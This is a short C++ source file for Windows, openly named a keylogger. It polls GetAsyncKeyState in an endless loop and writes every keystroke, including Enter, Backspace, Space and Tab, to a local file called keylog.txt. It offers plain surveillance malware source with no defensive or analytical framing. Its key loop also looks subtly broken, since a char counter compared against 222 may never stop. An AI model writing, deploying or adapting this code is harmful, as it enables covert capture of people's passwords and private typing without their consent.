#ifdef _WIN32
#include <iostream>
#include <fstream>
#include <windows.h>
#include "spdlog/spdlog.h"
#include "spdlog/sinks/basic_file_sink.h"

void logKey(spdlog::logger& logger, char key) {
    switch (key) {
        case VK_BACK: logger.info("[BACKSPACE]"); break;
        case VK_RETURN: logger.info("[ENTER]"); break;
        case VK_SPACE: logger.info("[SPACE]"); break;
        case VK_TAB: logger.info("[TAB]"); break;
        default: logger.info("{}", key); break;
    }
}

void keylogger() {
    auto logger = spdlog::basic_logger_mt("keylogger", "keylog.txt");
    char key;
    while (true) {
        for (key = 8; key <= 222; key++) {
            if (GetAsyncKeyState(key) == -32767) {
                logKey(*logger, key);
            }
        }
        Sleep(10); // Reduce CPU usage
    }
}

int main() {
    keylogger();
    return 0;
}
#endif
